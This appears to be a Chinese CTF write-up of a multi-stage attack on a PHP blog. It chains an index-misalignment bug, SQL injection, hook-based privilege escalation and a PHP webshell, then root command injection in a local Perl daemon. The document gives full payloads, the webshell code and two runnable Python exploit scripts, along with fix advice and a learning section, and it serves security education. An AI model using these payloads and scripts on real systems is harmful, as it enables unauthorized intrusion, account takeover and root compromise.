# cwp（SimpleBlog）靶场 Writeup

> 本文是独立文档：关键代码、请求、响应、脚本全部内嵌，不依赖任何外部文件。
> 目标是一个已授权的 CTF 容器，flag 位于 `/root/flag.txt`。

## 0. 结果

最终从容器内以 root 权限读取到：

```text
flag{987baa93-5670-4172-98c6-01afde158875}
```

---

## 1. 目标与攻击面

目标是一个用 PHP + MariaDB 写的极简博客，入口与接口如下：

```text
GET  /                         首页（文章列表，?tag= 服务端过滤）
GET  /article.php?id=N         文章详情 + 评论
POST /article.php?id=N         提交评论（表单）

GET  /feed.php?route=/api/articles[&owner=&tag=&omit=&ids=&count=&start=]
GET  /feed.php?route=/api/articles/{id}
GET  /feed.php?route=/api/articles/{id}/comments
POST /feed.php?route=/api/articles/{id}/comments
GET  /feed.php?route=/api/tags
GET  /feed.php?route=/api/archive
GET  /feed.php?route=/api/comments/recent
GET  /feed.php?route=/api/stats/summary
POST /feed.php?route=/api/login           {login, pass}
POST /feed.php?route=/api/users           {login, pass}       需要 staff 会话
POST /feed.php?route=/api/drafts          {title, text, tags}  需要 staff 会话
GET  /feed.php?route=/api/manage/accounts|settings|lookup     需要 staff 会话

POST /bulk.php                            批量操作引擎（公开）
GET  /manage.php?action=...               管理接口（需要 staff 会话）
```

数据表（通过后面的 SQL 注入枚举得到）：

```text
sitedb.staff_accounts   (id, login, secret)     secret 为 bcrypt
sitedb.entries          (id, title, slug, owner, excerpt, content,
                         created_at, status, kind, parent, snap_stale)
sitedb.entry_tags       (entry_id, tag)
sitedb.entry_comments   (id, entry_id, author, text, visible, created_at)
sitedb.site_config      (key_name, value)
sitedb.staff_sessions   (login, token_hash, expires)
sitedb.site_changesets  (id, setting_key, setting_value, author_login, status, ...)
```

其中 `status` 有 `published / draft / pending / api` 等取值，`kind` 有
`article / changeset / reload` 等取值；这个“状态 × 类型”的组合正是后面
hook 机制的开关。

---

## 2. 漏洞分析

本题不是一个单点漏洞，而是一条链：

1. `/bulk.php` 批量引擎的下标错位；
2. 嵌套 bulk 绕过外层动词白名单，把 GET 处理器拉进批量执行；
3. 路由错位使 `omit` 参数绕过 `id_list` 清洗，进入 SQL 字符串拼接触发注入；
4. 用 SQL 注入的 UNION 伪行触发 snapshot/hook，拿到请求内的 staff 权限；
5. 用这个权限创建永久 staff 账号，登录后用 skin editor 写 PHP webshell；
6. 通过 localhost 上 root 运行的 hpxd 服务完成 `www-data → root` 提权，读 flag。

### 2.1 漏洞 A：bulk 引擎的下标错位

批量引擎的关键结构（PHP）：

```php
function build_op($item) {
    if (!is_array($item)) {
        return ["err" => op_err("op_malformed")];
    }
    $route = isset($item["route"]) ? (string)$item["route"] : "";
    $u = parse_url($route);
    if ($u === false) {
        return ["err" => op_err("route_unparseable")];   // 关键：这里产生 build error
    }
    $op = [
        "verb"   => strtoupper(isset($item["verb"]) && $item["verb"] !== "" ? $item["verb"] : "POST"),
        "path"   => isset($u["path"]) ? $u["path"] : "/",
        "params" => [],
    ];
    if (!empty($u["query"])) {
        $qs = [];
        parse_str($u["query"], $qs);
        $op["params"] = array_merge($op["params"], $qs);
    }
    if (!empty($item["data"]) && is_array($item["data"])) {
        $op["params"] = array_merge($op["params"], $item["data"]);
    }
    return $op;
}

function bulk_engine($items, $policy) {
    $GLOBALS["CUR_OPS"] = $items;
    $ops = [];
    foreach ($items as $it) {
        $ops[] = build_op($it);
    }

    $matched = [];   // 只记录“没有 build error”的 op
    $checked = [];   // 每个 op 一项，下标与 $ops 对齐
    foreach ($ops as $op) {
        if (isset($op["err"])) {
            $checked[] = $op;
            continue;                 // 注意：$matched 不追加
        }
        $bind = route_bind($op);
        $matched[] = $bind;           // $matched 下标从此开始错位
        // ... op_check ...
    }

    foreach ($ops as $i => $op) {
        // ...
        $bind    = isset($matched[$i]) ? $matched[$i] : null;  // 用错位后的 bind
        $verdict = $checked[$i];                                // 用原始 op 的参数
        // ...
        $results[] = op_respond($verdict["op"], $bind["handler"]);
    }
}
```

当第 0 个 item 的 `route` 让 `parse_url()` 返回 `false` 时（例如 `http://`），
它只有 `checked[0]`，不占 `matched`。于是执行阶段：

```text
i = 1：使用 matched[1]（其实是第 2 个合法 op 的路由处理器）
       配上 checked[1]（第 1 个合法 op 自己的参数）
```

即：**第 i 个合法 op 的参数，被交给第 i+1 个 op 的处理器执行**。

### 2.2 漏洞 B：嵌套 bulk 绕过动词限制，`omit` 未清洗导致 SQL 注入

`/bulk.php` 第一层只允许写动词：

```php
$v = strtoupper($it["verb"] ?? "POST");
if (!in_array($v, ["POST", "PUT", "PATCH", "DELETE"], true)) {
    die(json_encode(op_err("verb_not_allowed")));
}
```

所以最外层无法直接发 `GET /api/articles`。但错位可以把公开的
`exec_bulk()` 处理器拉进来执行，而 `exec_bulk()` 对**内层 op 不再限制动词**：

```php
function exec_bulk($op) {
    $inner = $op["params"]["ops"] ?? null;
    if (!is_array($inner)) return op_err("ops_body_invalid");
    if (count($inner) > 25)   return op_err("ops_too_many");
    foreach ($inner as $it) {
        if (!is_array($it) || !isset($it["route"]) || !is_string($it["route"])) {
            return op_err("op_malformed");
        }
    }
    $GLOBALS["NEST_LEVEL"] = ($GLOBALS["NEST_LEVEL"] ?? 0) + 1;
    if ($GLOBALS["NEST_LEVEL"] > 2) { $GLOBALS["NEST_LEVEL"]--; return op_err("ops_too_many"); }
    $out = bulk_engine($inner, "best-effort");   // 内层 op 的 verb 不受第一层白名单约束
    $GLOBALS["NEST_LEVEL"]--;
    return $out;
}
```

于是内层可以写 `"verb": "GET"`。

参数清洗逻辑只清洗“该路由声明的参数”：

```php
function sanitize_arg($type, $v) {
    switch ($type) {
        case "int":     return (int)$v;
        case "text":    return is_string($v) ? $v : implode(",", (array)$v);
        case "id_list":
            $arr = is_array($v) ? $v : [$v];
            $out = [];
            foreach ($arr as $n) { if (absint($n) > 0) $out[] = absint($n); }
            return $out;
    }
    return $v;
}

function op_check($bind) {
    $h  = $bind["handler"];
    $op = $bind["op"];
    foreach (($h["args"] ?? []) as $name => $spec) {
        if (!array_key_exists($name, $op["params"])) { /* required 检查 */ continue; }
        $op["params"][$name] = sanitize_arg($spec["type"], $op["params"][$name]);
    }
    return ["op" => $op];
}
```

`/api/articles` 声明了 `omit => id_list`，但 `/api/articles/{id}/comments` 没声明
`omit`。利用内层的下标错位，把“评论路由”的参数（其中带原始字符串 `omit`）
交给 `exec_articles_list()`，`omit` 就不会经过 `id_list` 清洗：

```php
function exec_articles_list($op) {
    $spec = ["status" => "published"];
    foreach (["omit" => "owner_not_in", "ids" => "ids"] as $api => $internal) {
        if (isset($op["params"][$api]) && $op["params"][$api] !== "") {
            $spec[$internal] = $op["params"][$api];   // 原始字符串
        }
    }
    // ...
}

function posts_lookup($spec = []) {
    $conds = ["status = ?"];
    $args  = [$spec["status"] ?? "published"];
    if (!empty($spec["owner_not_in"])) {
        if (is_array($spec["owner_not_in"])) {          // 数组才会 absint
            $spec["owner_not_in"] = array_unique(array_map("absint", $spec["owner_not_in"]));
            sort($spec["owner_not_in"]);
        }
        $ids = implode(",", (array)$spec["owner_not_in"]);  // 字符串原样拼接
        $conds[] = "owner NOT IN ($ids)";
    }
    $limit  = isset($spec["limit"])  ? max(1, min(100, (int)$spec["limit"]))  : 20;
    $offset = isset($spec["offset"]) ? max(0, (int)$spec["offset"]) : 0;
    $sql = "SELECT id, title, slug, owner, excerpt, created_at, status, kind, parent, snap_stale"
         . " FROM entries WHERE " . implode(" AND ", $conds)
         . " ORDER BY created_at DESC LIMIT $limit OFFSET $offset";
    return rows_all($sql, $args);
}
```

最终 SQL 形态：

```sql
SELECT id,title,slug,owner,excerpt,created_at,status,kind,parent,snap_stale
FROM entries
WHERE status = 'published' AND owner NOT IN (<我们自己拼进去的内容>)
ORDER BY created_at DESC LIMIT 20 OFFSET 0
```

### 2.3 漏洞 C：hook 机制造成的请求内提权（`PUBLISH_AS`）

列表接口会对“快照过期”的文章做一次写回：

```php
function exec_articles_list($op) {
    $rows = posts_lookup($spec);
    foreach ($rows as $r) {
        $full = entry_fetch((int)$r["id"]);       // 会优先命中 ROW_CACHE
        if ($full && (int)$full["snap_stale"] === 1) {
            snapshot_write($full);                // 按行里的 status/kind 触发 hook
        }
    }
    if (($GLOBALS["HOOK_RUNNING"] ?? 0) === 0) {
        unset($GLOBALS["PUBLISH_AS"]);            // 请求级提权标记，用完即清
    }
    // ...
}

function snapshot_write($full, $content = null) {
    $id = (int)$full["id"];
    run_sql("UPDATE entries SET title=?, slug=?, owner=?, status=?, kind=?, parent=?, snap_stale=0 WHERE id=?",
            [$full["title"], $full["slug"], $full["owner"], $full["status"],
             $full["kind"], (int)$full["parent"], $id]);
    cache_remember("entries", $id, array_merge($full, ["snap_stale" => 0]));
    hooks_fire($full["status"] . "_" . $full["kind"], $full);   // 例如 pending_changeset
    repair_ancestry($id, []);
}

$GLOBALS["HOOKS"] = [
    "pending_changeset" => "hook_changeset_promote",
    "api_reload"        => "hook_api_reload",
];
```

两个关键 hook：

```php
function hook_changeset_promote($entry) {
    $key   = (string)($entry["title"] ?? "");
    $value = (string)($entry["content"] ?? "");
    $login = (string)($entry["owner"] ?? "");
    if ($key === "" || $login === "") return;
    // 去重后插入一条 ready changeset
    run_sql("INSERT INTO site_changesets (setting_key, setting_value, author_login, status)
             VALUES (?, ?, ?, 'ready')", [$key, $value, $login]);
    $cs = row_one("SELECT id FROM site_changesets WHERE setting_key=? AND author_login=?
                   AND status='ready' ORDER BY id DESC LIMIT 1", [$key, $login]);
    if ($cs) changeset_publish((int)$cs["id"]);
}

function changeset_publish($cs_id) {
    $cs = row_one("SELECT * FROM site_changesets WHERE id = ?", [(int)$cs_id]);
    if (!$cs || $cs["status"] !== "ready") return;
    if (!login_is_staff($cs["author_login"])) return;
    $GLOBALS["PUBLISH_AS"] = $cs["author_login"];   // 请求级“我是 staff”
    // 若 key 在白名单内还会写 site_config，这里不需要
    run_sql("UPDATE site_changesets SET status='published' WHERE id=?", [(int)$cs_id]);
}

function hook_api_reload($entry) {
    if (($GLOBALS["HOOK_RUNNING"] ?? 0) > 0) return;
    if (empty($GLOBALS["CUR_OPS"]) || !is_array($GLOBALS["CUR_OPS"])) return;
    $GLOBALS["HOOK_RUNNING"] = 1;
    $GLOBALS["FOLLOWUP_OUT"] = ops_run_all($GLOBALS["CUR_OPS"]);  // 用当前批量 ops 重放
    $GLOBALS["HOOK_RUNNING"] = 0;
}
```

而 staff 权限检查优先看这个全局变量：

```php
function staff_session_valid() {
    $actor = publishing_as();                       // $GLOBALS["PUBLISH_AS"] ?? null
    if ($actor !== null && login_is_staff($actor)) return true;
    // ... 否则校验 site_staff cookie 的 HMAC 和 staff_sessions 表 ...
}

function perm_staff($op) {
    if (!staff_session_valid()) return op_err("staff_session_required");
    return true;
}
```

利用方式：

1. SQL 注入的 UNION 结果里放两条“伪行”，它们的 `id` 不与真实文章冲突
   （如 `1000001/1000002`），并且 `snap_stale = 1`；
2. 第一行：`status=pending, kind=changeset, owner=<SQLi 读到的真实 staff 登录名>`；
   `exec_articles_list` 遍历到它时会调用 `snapshot_write`，触发
   `pending_changeset → hook_changeset_promote → changeset_publish`，
   把 `PUBLISH_AS` 设成真实 staff 登录名；
3. 第二行：`status=api, kind=reload`；触发 `hook_api_reload`，
   它会把当前那次 bulk 的内层 ops 再跑一遍。此时 `PUBLISH_AS` 仍在，
   所以受 `perm_staff` 保护的 `POST /api/users` 也能通过；
4. 内层 ops 里放入创建账号的 op：

```json
{"route":"/api/users","verb":"POST","data":{"login":"pwned1234","pass":"PwnedPass123!"}}
```

这样就得到了一个口令已知的 staff 账号。

### 2.4 漏洞 D：root 运行的 hpxd 服务与命令注入

拿到 staff 后，`manage.php?action=skin-editor` 可以把任意 PHP 代码写进
`/var/www/uploads/skins/<name>.php`（该目录可被 Web 访问）：

```php
function skin_editor_write($name, $code) {
    if (!preg_match("/^[a-z0-9][a-z0-9-_]{0,40}$/", $name)) { /* 拒绝 */ }
    $dir  = "/var/www/uploads/skins";
    $path = "$dir/$name.php";
    file_put_contents($path, $code);
    return ["written" => "/uploads/skins/$name.php"];
}
```

但 webshell 是 `www-data`，`/root` 是 `0700 root`，读不到 `/root/flag.txt`。
`/root` 下还有 `/root/.vault_key`，而 mysql 里还有应用账号无权访问的
`vaultdb`——本机的 hpxd 服务（root 运行）正是为它们服务的。

hpxd 监听 `127.0.0.1:9443/9444/9446/9447`。9446/9447 的 `/ops/code`
直接输出自身源码（“code inspection”），源码中的关键逻辑：

```perl
# 1) 每个 hpx_id cookie 对应一个内存中的会话状态
sub vault_open {
    my %kv = (
        awaiting_signin => 1,
        skin => "default", ui_lang => "zh-CN", tz => "Asia/Shanghai",
        scramble => $scramble, zone => "hx_" . rand_num(),
        # ...
    );
    my $raw = join("\n", map { "$_=$kv{$_}" } sort keys %kv);
    $VAULT{$t} = { raw => $raw, cache => {}, cache_ok => 0, ... };
}

# 2) 写入会话字段：key=value 直接拼行
sub vault_put {
    my ($t, $k, $v) = @_;
    my @lines = grep { $_ !~ /^\Q$k\E=/ } split(/\r?\n/, $s->{raw}, -1);
    push @lines, "$k=$v";
    $s->{raw} = join("\n", @lines);
}

# 3) 读取会话字段
sub vault_fetch {
    my ($t) = @_;
    my $s = $VAULT{$t} or return {};
    return $s->{cache} if $s->{cache_ok};
    my %kv;
    for my $line (split(/\r?\n/, $s->{raw}, -1)) {
        my ($k, $v) = split(/=/, $line, 2);
        $kv{$k} = defined $v ? $v : "";
    }
    # 只有 secret 会尝试 base64 解码
    $s->{cache} = \%kv;
    $s->{cache_ok} = 1;
    return \%kv;
}

# 4) 登录态判定
sub vault_is_master {
    my ($s) = @_;
    return 0 unless defined $s->{master_flag} && $s->{master_flag} eq "1";
    return 0 unless defined $s->{otp_done} && $s->{otp_done} eq "1";
    return 0 unless defined $s->{login} && $s->{login} eq "root";
    if (defined $s->{sudo_until} && $s->{sudo_until} =~ /^\d+$/ && $s->{sudo_until} > time()) {
        return 1;           # 只要 sudo_until 在未来就放行
    }
    # 否则还要知道 root 的 master secret 摘要
    my $h = master_digest();
    return ($h ne "" && defined $s->{secret} && md5_hex($s->{secret}) eq $h) ? 1 : 0;
}

# 5) 可被命令注入的文件列表接口
if ($endpoint eq "files/list") {
    my $dir = $qs{path} // "/home/siteuser";
    $dir =~ s/[\x00-\x09\x0b-\x1f\x7f]+/ /g;      # 只替换部分控制字符
    open my $fh, "-|", "timeout", "-k", "5", $EXEC_SECONDS,
         "/bin/sh", "-c", "ls -la " . $dir;        # 分号/管道等并未过滤
    # 输出返回给客户端
}
```

两个缺陷叠加：

- **会话状态注入**：`vault_put` 用 `key=value` 拼行，如果 value 里带换行，
  就会额外产生新的键值对。Basic 认证写入 `login/secret` 时没有做
  `sess_value_clean()`（后者只用于 `/login` 表单），并且 `cloak_store()`
  在“cookie 带了 hpx_id 但 scramble 为空”时直接返回明文：

```perl
sub cloak_store {
    my ($t, $secret, $has_cookie, $cookie_scramble) = @_;
    my $state = vault_fetch($t);
    my $key_use = $has_cookie ? ($cookie_scramble // "") : ($state->{scramble} // "");
    return (length $key_use) ? cloak_text($secret, $key_use) : $secret;  # 空密钥 => 明文
}
```

- **命令注入**：`files/list` 用 `sh -c "ls -la $dir"`，`$dir` 来自
  `?path=`，只过滤了一部分控制字符，`;` `|` 等都能用。

---

## 3. 完整利用过程

下面的请求均以新容器地址为例（变量用 `<TARGET>` 代替）：

```text
<TARGET> = https://eci-2ze6bij3pcxb9oz7we88.cloudeci1.ichunqiu.com:80
```

### 3.0 探测

```bash
curl -s "$TARGET/feed.php?route=/api/stats/summary"
# {"summary":{"entries":5,"drafts":1,"comments":4,"changesets":0,"owners":4,...}}

curl -s "$TARGET/feed.php?route=/api/archive"
# {"archive":[{"month":"2026-10","posts":5}]}

curl -s "https://<TARGET>/bulk.php" -d '{}'
# {"error":{"code":"ops_body_invalid",...}}
```

`/api/articles/{id}` 只返回 `status='published'`，草稿 id=5 读不到；
`staff_accounts` 的登录名是随机十六进制串，`staff_sessions` 为空。

先确认 `parse_url()` 会失败的 route（用于制造 build error）：

```bash
curl -s -X POST "$TARGET/bulk.php" -H 'Content-Type: application/json' \
  -d '{"ops":[{"route":"http://","verb":"POST","data":{}}]}'
# {"results":[{"error":{"code":"route_unparseable","status":400}}]}
```

### 3.1 确认 SQL 注入

外层 ops 用 `[坏路由, 评论op(带内层ops), /api/bulk]`；内层 ops 用
`[坏路由, 评论op(带原始omit), /api/articles]`：

```http
POST /bulk.php HTTP/1.1
Content-Type: application/json

{
  "ops": [
    {"route": "http://", "verb": "POST", "data": {}},
    {"route": "/api/articles/1/comments?id=1", "verb": "POST", "data": {
      "ops": [
        {"route": "http://", "verb": "GET", "data": {}},
        {"route": "/api/articles/1/comments?id=1", "verb": "GET", "data": {
          "omit": "0) UNION SELECT 111,222,333,444,555,666,777,888,999,000-- -"
        }},
        {"route": "/api/articles", "verb": "GET", "data": {}}
      ]
    }},
    {"route": "/api/bulk", "verb": "POST", "data": {}}
  ]
}
```

响应里嵌套的 `articles` 出现了我们注入的常量，说明 UNION 成功：

```json
{"results":[
  {"error":{"code":"route_unparseable","status":400}},
  [
    {"error":{"code":"route_unparseable","status":400}},
    {"articles":[{"id":111,"title":"222","slug":"333","owner":"444",
                  "excerpt":"555","created_at":"666","status":"777",
                  "kind":"888","parent":999,"snap_stale":0}]},
    {"error":{"code":"route_no_handler","status":500}}
  ],
  {"error":{"code":"route_bulk_rejected","status":400}}
]}
```

列映射固定为：

```text
id, title, slug, owner, excerpt, created_at, status, kind, parent, snap_stale
```

### 3.2 读库（staff 登录名、hash、配置）

把 UNION 的 SELECT 列表换成子查询即可，例如：

```sql
0) UNION SELECT
  1000+id, login, LEFT(secret,100), secret, '', '9999-12-31 23:59:59',
  'published', 'article', 0, 0
FROM staff_accounts-- -
```

响应（示例）：

```json
{"id":1001,"title":"ddb3bf501e",
 "slug":"$2y$10$ac4tPIPQn7aTX/zebVp60u9VTrrb/edKYlWkPcxu7No0B8V6FZ2zC",
 "owner":"$2y$10$ac4tPIPQn7aTX/zebVp60u9VTrrb/edKYlWkPcxu7No0B8V6FZ2zC",
 "status":"published","kind":"article","parent":0,"snap_stale":0}
```

由此知道真实 staff 登录名（示例 `ddb3bf501e`）。`staff_sessions` 为空，
说明不能伪造 cookie，必须走 hook 提权。

### 3.3 伪造 changeset + api_reload，创建 staff 账号

把两条“伪行”放进 UNION，并用 `created_at` 控制处理顺序（pending 在前）：

```sql
0) UNION SELECT
  1000001,'k1','s1','ddb3bf501e','e1','9999-12-31 23:59:59',
  'pending','changeset',0,1
  UNION SELECT
  1000002,'k2','s2','x','e2','9999-12-31 23:59:58',
  'api','reload',0,1-- -
```

内层 ops 里加上创建账号的 op：

```json
[
  {"route":"http://","verb":"GET","data":{}},
  {"route":"/api/articles/1/comments?id=1","verb":"GET","data":{
     "omit":"<上面的 UNION payload>"}},
  {"route":"/api/articles","verb":"GET","data":{}},
  {"route":"/api/users","verb":"POST","data":{
     "login":"pwned1234","pass":"PwnedPass123!"}}
]
```

响应的 `followup` 中可以看到账号创建成功：

```json
{"articles":[...],
 "followup":[
   {...},
   {"comments":[...]},
   {"articles":[...]},
   {"user":{"login":"pwned1234"},"created":true}
 ]}
```

随后 `changesets` 计数从 0 变为 1，证明 changeset 被 promote。

### 3.4 登录并写 webshell

```bash
curl -i -s "$TARGET/feed.php?route=/api/login" \
  -H 'Content-Type: application/json' \
  -d '{"login":"pwned1234","pass":"PwnedPass123!"}'
# 200 {"status":1,"login":"pwned1234","expires":...}
# Set-Cookie: site_staff=<login>|<expires>|<token>|<hmac>
```

用这个 cookie 调管理接口写 PHP：

```http
POST /manage.php?action=skin-editor HTTP/1.1
Cookie: site_staff=<...>
Content-Type: application/x-www-form-urlencoded

name=shell&code=<?php echo 'PWN:'; system($_GET['cmd']); ?>
```

响应：

```json
{"written":"/uploads/skins/shell.php"}
```

验证 RCE：

```bash
curl -s "$TARGET/uploads/skins/shell.php?cmd=id"
# PWN:uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

此时读取 `/root/flag.txt` 会得到 `Permission denied`，因为 `/root` 是 `0700 root`。

### 3.5 `www-data → root`：hpxd 会话注入 + 命令注入

先通过 webshell 确认 9446/9447 的源码泄露：

```bash
curl -s http://127.0.0.1:9446/ops/code | head
# <html><head><title>hpxd source</title>...
```

利用分四步（全部从容器内部发往 `127.0.0.1:9446`）：

```text
A) GET /                                         -> 拿到 Set-Cookie: hpx_id=<token>,<scramble>
B) GET /   Cookie: hpx_id=<token>,               （逗号后留空，使 scramble 为空）
   Authorization: Basic base64("root\nmaster_flag=1\notp_done=1\nsudo_until=9999999999:x")
                                                 -> 307 Location: /<zone>/
C) GET /hx_1/  Cookie: hpx_id=<token>,           -> 401（触发 vault_rescan，刷新缓存）
D) GET /<zone>/files/list?path=%3Bcat%20%2Froot%2Fflag.txt
   Cookie: hpx_id=<token>,                       -> 命令注入，以 root 执行
```

B 步注入后的会话行等价于：

```text
login=root
master_flag=1
otp_done=1
sudo_until=9999999999
```

于是 `vault_is_master()` 直接通过；C 步用错误 zone 让服务端
`vault_rescan()` 丢掉旧缓存；D 步 zone 正确，进入 `files/list`：

```text
实际执行的 shell：ls -la ;cat /root/flag.txt
```

最终返回：

```text
flag{987baa93-5670-4172-98c6-01afde158875}
```

---

## 4. 可复现脚本

### 4.1 远程部分（从你的机器打 `/bulk.php`）

```python
#!/usr/bin/env python3
# 用途：SQLi 确认 / dump / 通过 hook 创建 staff 账号 / 写 webshell
import requests, urllib3, json, sys

urllib3.disable_warnings()
TARGET = "https://<TARGET>:80"

REAL_LOGIN = "<SQLi 读到的真实 staff 登录名>"
NEW_LOGIN  = "pwned1234"
NEW_PASS   = "PwnedPass123!"

s = requests.Session()
s.verify = False


def bulk(ops):
    r = s.post(TARGET + "/bulk.php", json={"ops": ops}, timeout=20)
    return r.json()


def sqli(exprs, extra=""):
    """exprs: 10 个 SQL 表达式，对应 10 列；返回 articles 列表"""
    payload = "0) UNION SELECT " + ",".join(exprs) + extra + "-- -"
    inner = [
        {"route": "http://", "verb": "GET", "data": {}},
        {"route": "/api/articles/1/comments?id=1", "verb": "GET",
         "data": {"omit": payload}},
        {"route": "/api/articles", "verb": "GET", "data": {}},
    ]
    outer = [
        {"route": "http://", "verb": "POST", "data": {}},
        {"route": "/api/articles/1/comments?id=1", "verb": "POST",
         "data": {"ops": inner}},
        {"route": "/api/bulk", "verb": "POST", "data": {}},
    ]
    res = bulk(outer)
    for item in res["results"][1]:
        if isinstance(item, dict) and "articles" in item:
            return item["articles"]
    return res


# 1) dump staff_accounts
rows = sqli(
    ["1000+id", "login", "LEFT(secret,100)", "secret", "''",
     "'9999-12-31 23:59:59'", "'published'", "'article'", "0", "0"],
    " FROM staff_accounts",
)
print(json.dumps(rows, ensure_ascii=False, indent=2))

# 2) 通过 hook 链创建账号
pending = ["1000001", "'k1'", "'s1'", f"'{REAL_LOGIN}'", "'e1'",
           "'9999-12-31 23:59:59'", "'pending'", "'changeset'", "0", "1"]
reload_row = ["1000002", "'k2'", "'s2'", "'x'", "'e2'",
              "'9999-12-31 23:59:58'", "'api'", "'reload'", "0", "1"]
payload = ("0) UNION SELECT " + ",".join(pending)
           + " UNION SELECT " + ",".join(reload_row) + "-- -")

inner = [
    {"route": "http://", "verb": "GET", "data": {}},
    {"route": "/api/articles/1/comments?id=1", "verb": "GET",
     "data": {"omit": payload}},
    {"route": "/api/articles", "verb": "GET", "data": {}},
    {"route": "/api/users", "verb": "POST",
     "data": {"login": NEW_LOGIN, "pass": NEW_PASS}},
]
outer = [
    {"route": "http://", "verb": "POST", "data": {}},
    {"route": "/api/articles/1/comments?id=1", "verb": "POST",
     "data": {"ops": inner}},
    {"route": "/api/bulk", "verb": "POST", "data": {}},
]
print(json.dumps(bulk(outer), ensure_ascii=False))

# 3) 登录 + 写 webshell
r = s.post(TARGET + "/feed.php", params={"route": "/api/login"},
           json={"login": NEW_LOGIN, "pass": NEW_PASS}, timeout=15)
print(r.status_code, r.text)
code = "<?php echo 'PWN:'; system($_GET['cmd']); ?>"
r = s.post(TARGET + "/manage.php", params={"action": "skin-editor"},
           data={"name": "shell", "code": code}, timeout=15)
print(r.status_code, r.text)
```

### 4.2 容器内部部分（通过 webshell 执行）

```python
#!/usr/bin/env python3
# 用途：利用 127.0.0.1:9446 的 hpxd，以 root 执行命令
import http.client, base64, re, sys

HOST, PORT = "127.0.0.1", 9446
CMD = sys.argv[1] if len(sys.argv) > 1 else "cat /root/flag.txt"


def req(method, path, cookie=None, basic=None):
    c = http.client.HTTPConnection(HOST, PORT, timeout=10)
    h = {}
    if cookie:
        h["Cookie"] = cookie
    if basic:
        h["Authorization"] = "Basic " + basic
    c.request(method, path, headers=h)
    r = c.getresponse()
    data = r.read()
    hd = {k.lower(): v for k, v in r.getheaders()}
    c.close()
    return r.status, hd, data


# A：拿一个全新会话
st, hd, _ = req("GET", "/")
token = re.search(r"hpx_id=([^;]+)", hd.get("set-cookie", "")).group(1).split(",")[0]

# B：Basic 认证 + 换行注入；cookie 的 scramble 留空 => cloak_store 存明文
user = "root\nmaster_flag=1\notp_done=1\nsudo_until=9999999999"
basic = base64.b64encode((user + ":x").encode()).decode()
st, hd, body = req("GET", "/", cookie=f"hpx_id={token},", basic=basic)
zone = hd.get("location", "").strip("/").split("/")[0]
print("zone =", zone)

# C：访问错误 zone，迫使服务端 vault_rescan() 重新解析注入后的 raw
req("GET", "/hx_1/", cookie=f"hpx_id={token},")

# D：进入正确 zone，files/list 命令注入，以 root 执行
q = CMD.replace(";", "%3B").replace(" ", "%20").replace("/", "%2F")
st, hd, data = req("GET", f"/{zone}/files/list?path=%3B{q}", cookie=f"hpx_id={token},")
print(data.decode("latin1"))
```

---

## 5. 修复建议

- `bulk_engine()`：用与原始下标严格对齐的数组保存 `matched`，或在执行前
  重新做一次 `route_bind/op_check`；build error 的 op 必须占位。
- 内层 bulk 必须继承外层动词白名单；`exec_bulk` 不应暴露给普通用户。
- `owner_not_in` 无论如何都先 `array_map('absint')`；不要依赖调用方是否
  传数组。
- 取消 `PUBLISH_AS` 这种“请求内全局提权”；由 hook 触发的写操作单独鉴权。
- hpxd：Basic 认证路径复用 `sess_value_clean()`；`cloak_store()` 禁止空密钥
  直通；`files/list` 改成白名单路径或参数化调用，禁止 `sh -c` 拼接。
- `manage.php` 的 skin editor 建议限制写入内容（只允许模板语法）并做审计。

---

## 6. 新手向：这道题难在哪？涉及什么知识点？需要什么技能？

### 6.1 这道题的难点

1. **不是单点漏洞，而是多阶段链**
   单看 SQL 注入，只能读数据库；单看 skin editor，需要 staff；单看 hpxd，
   需要一个能访问 localhost 的立足点。必须把 A→B→C→D 串起来才能拿 flag。
2. **第一处漏洞极其隐蔽**
   `bulk_engine` 的错误是“数组下标错位”：只有 `build_op()` 返回错误时
   才会触发，而且不在报错里表现出来，只体现在“哪个处理器收到了谁的参数”。
   这种逻辑漏洞没有现成扫描器能发现，只能读源码、画数据流。
3. **两层批量引擎的语义差异**
   外层 `bulk.php` 限制动词，内层 `exec_bulk()` 不限制；再叠加下标错位，
   才能把只允许 GET 的处理器拉进来。需要同时理解“谁能调谁”和“参数被谁清洗”。
4. **权限模型少见**
   不是传统的 cookie/role，而是 `PUBLISH_AS` 这种请求内全局变量 +
   `snapshot_write → hooks_fire → changeset_publish` 的间接提权。
   要读懂 hook 表、状态/类型拼接、缓存（`ROW_CACHE`）和 `HOOK_RUNNING` 的时序。
5. **SQL 注入本身也被藏起来了**
   `omit` 本来会被 `id_list` 清洗成整数数组；只有通过路由错位换一个
   “没有声明 omit”的路由，才能把原始字符串送进 `owner NOT IN (...)`。
6. **拿到的第一层 shell 不够**
   webshell 是 `www-data`，flag 在 `0700 root` 的 `/root` 下。需要继续
   在容器里做本地侦察，发现 localhost 的 root 服务（hpxd），再读 Perl 源码、
   理解自定义会话状态机，利用“换行注入 + 空密钥 + 缓存刷新 + 命令注入”。
7. **编码细节多**
   嵌套 bulk 的 JSON、路由 query、`omit` 中的 SQL、hpxd 的 cookie 逗号、
   `/login` 与 Basic 两条路径的差异、query 先按 `;` 分割再 URL 解码……
   任何一处编码或时序不对，链子就断了。

### 6.2 涉及的知识点

- **Web/HTTP**：GET/POST、表单 vs JSON、Cookie、Authorization Basic、
  URL 编码、状态码与 Location 跳转。
- **PHP**：数组与下标、`parse_url` 的失败返回、类型转换与 `absint`、
  `array_key_exists`、`implode`、全局变量 `$GLOBALS`、静态缓存。
- **数据库**：PDO 预处理与“字符串拼接”的区别、`IN/NOT IN`、
  `UNION SELECT` 的列数/类型、`information_schema`、MariaDB 报错与权限。
- **认证/会话**：bcrypt、HMAC 签名 cookie、会话表校验、请求级提权。
- **PHP 安全**：SQL 注入、任意文件写入、命令注入、会话状态注入。
- **Linux**：`www-data` 与 root 的权限边界、`/root` 0700、SUID、本地端口、
  Unix socket、进程与服务。
- **Perl/网络编程**：单文件 HTTP 守护进程、`IO::Select`、自定义解析、
  会话状态机、`open "-|"` 执行 shell。
- **方法论**：源码审计、数据流追踪、差分调试、漏洞链、最小化复现。

### 6.3 掌握本题需要的能力

1. **能读源码**：不是只看某个函数，而是能从 HTTP 参数一路追到 SQL/文件/命令。
2. **懂“参数清洗边界”**：哪个路由声明了哪个参数、谁调用谁、清洗发生在哪一层。
3. **会构造和调试请求**：会用 Python `requests`/curl 精确构造嵌套 JSON、
   编码特殊字符，并对比响应找差异。
4. **会数据库注入**：UNION 的列对齐、把任意 SELECT 结果映射到 JSON 字段。
5. **懂认证机制**：知道“登录校验”和“权限校验”可能不是同一段代码，
   知道请求内全局态会带来什么风险。
